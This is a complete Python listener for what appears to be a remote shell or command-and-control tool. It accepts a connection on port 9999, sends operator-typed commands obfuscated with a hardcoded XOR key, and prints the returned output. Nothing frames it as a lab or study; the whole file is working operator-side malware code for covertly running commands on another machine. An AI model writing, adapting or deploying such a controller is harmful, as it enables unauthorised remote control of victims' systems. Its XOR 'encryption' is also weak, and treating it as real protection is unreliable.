import socket

ENCRYPTION_KEY = b'secretkey'
PORT = 9999

def xor_crypt(message, key):
    return bytes([byte ^ key[index % len(key)] for index, byte in enumerate(message)])

def handle_client(connection):
    try:
        while True:
            command = input("Enter command: ")
            if not command:
                continue

            # Encrypt and send command
            command_data = xor_crypt(command.encode(), ENCRYPTION_KEY)
            connection.send(command_data)

            if command.lower() == 'exit':
                break

            # Receive and decrypt output
            output_data = connection.recv(65536)
            output = xor_crypt(output_data, ENCRYPTION_KEY).decode(errors='ignore')
            print(f"Output:\n{output}")

    except Exception as error:
        print(f"Error: {error}")
    finally:
        connection.close()

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', PORT))
    server_socket.listen(1)
    print("Server listening on port 9999 ...")

    while True:
        connection, address = server_socket.accept()
        print(f"Accepted connection from {address[0]}:{address[1]}")
        handle_client(connection)

if __name__ == "__main__":
    start_server()
